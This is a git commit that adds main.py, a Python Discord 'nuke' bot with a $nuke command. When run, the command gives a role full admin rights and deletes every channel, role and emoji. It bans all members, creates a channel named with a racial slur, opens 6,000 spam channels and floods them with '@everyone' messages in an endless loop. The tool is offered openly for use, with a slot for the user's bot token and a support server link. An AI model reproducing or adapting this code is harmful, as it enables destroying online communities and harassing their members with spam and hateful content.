941a0be47e90e82678da1473ad187b75af33a05a
blackgoku689 <105511986+blackgoku689@users.noreply.github.com>
2022-05-13 19:16:19 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,97 @@
+import discord
+from discord.ext import commands
+import random
+from discord import Permissions
+from colorama import Fore, Style
+import asyncio
+
+#PASTE YOUR BOT TOKEN
+token = ""
+
+
+SPAM_CHANNEL =  ["raided by black goku"] 
+SPAM_MESSAGE = ["@everyone get nuked lol" ]
+
+client = commands.Bot(command_prefix="$")
+
+#TYPE $NUKE TO DESTROY THE SERVER
+
+@client.event
+async def on_ready():
+   print('''
+ _       _ 
+| | ___ | |
+| |/ _ \| |
+| | (_) | |
+|_|\___/|_|        
+
+getting fucked 
+$nuke for a spook
+support server: https://discord.gg/a7c2g8EhkP
+''')
+   
+
+@client.command()
+@commands.is_owner()
+async def stop(ctx):
+    await ctx.bot.logout()
+    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
+
+@client.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    try:
+      role = discord.utils.get(guild.roles, name = "monke")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+    except:
+      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
+    for channel in guild.channels:
+      try:
+        await channel.delete()
+        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+    for role in guild.roles:
+     try:
+       await role.delete()
+       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
+    for emoji in list(ctx.guild.emojis):
+     try:
+       await emoji.delete()
+       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+    banned_users = await guild.bans()
+    for ban_entry in banned_users:
+      user = ban_entry.user
+      try:
+        await user.unban("Davidboi#5462")
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+    await guild.create_text_channel("NIGGERS")
+    for channel in guild.text_channels:
+        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        print(f"New Invite: {link}")
+    amount = 6000
+    for i in range(amount):
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+    print(f"nuked {guild.name} Successfully.")
+    return
+
+@client.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(SPAM_MESSAGE))
+
+client.run(token, bot=True)
